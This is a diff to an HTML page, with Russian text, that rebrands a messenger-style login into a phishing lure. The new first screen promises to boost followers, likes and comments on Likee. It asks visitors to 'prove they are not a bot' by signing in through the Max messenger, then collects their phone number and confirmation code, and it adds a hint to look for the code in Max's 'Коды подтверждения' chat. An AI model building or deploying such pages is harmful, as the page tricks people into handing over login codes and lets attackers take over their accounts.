@@ -153,6 +153,46 @@
     background: #fff;
   }
 
+  .btn-with-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 2px;
+  }
+
+  .btn-icon {
+    width: 45px;
+    height: 45px;
+    object-fit: contain;
+  }
+
+  .btn-with-icon span {
+    font-size: 22px;
+    font-weight: 600;
+  }
+
+  .top-info {
+    position: absolute;
+    top: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 5px;
+    margin-bottom: 0px;
+  }
+
+  .top-img {
+    width: 45px;
+    height: 45px;
+    border-radius: 50%;
+    object-fit: cover;
+  }
+
+  .top-text {
+    font-size: 32px;
+    font-weight: 500;
+  }
+
 </style>
 </head>
 
@@ -162,13 +202,20 @@
 
   <!-- SCREEN 1 -->
   <div class="screen active" id="s1">
-    <h1>Добро пожаловать</h1>
-    <p class="subtext">Современный мессенджер нового поколения</p>
-    <button class="btn primary" onclick="go('s2')">Войти</button>
+    <h1>Продвижение в Likee</h1>
+    <p class="subtext">Чтобы накрутить подписчиков, лайки и комментарии, нам необходимо убедиться, что Вы - не бот, для этого авторизуйтесь с помощью национального мессенджера Max</p>
+    <button class="btn primary btn-with-icon" onclick="go('s2')">
+      <img src="maxicon.png" class="btn-icon">
+      <span>Войти</span>
+    </button>
   </div>
 
   <!-- SCREEN 2 -->
   <div class="screen" id="s2">
+    <div class="top-info">
+      <img src="maxicon.png" class="top-img">
+      <span class="top-text">Max</span>
+    </div>
 
     <h1>С каким номером телефона хотите войти?</h1>
     <p class="subtext">На него придёт код</p>
@@ -190,7 +237,7 @@
   <div class="screen" id="s3">
 
     <h1 id="codeTitle">Отправили код</h1>
-    <p class="subtext">Проверьте чат "Коды подтверждения"</p>
+    <p class="subtext">Если не получили СМС, проверьте чат «Коды подтверждения» в MAX</p>
 
     <div class="code-box">
       <input type="tel" inputmode="numeric" maxlength="1"/>
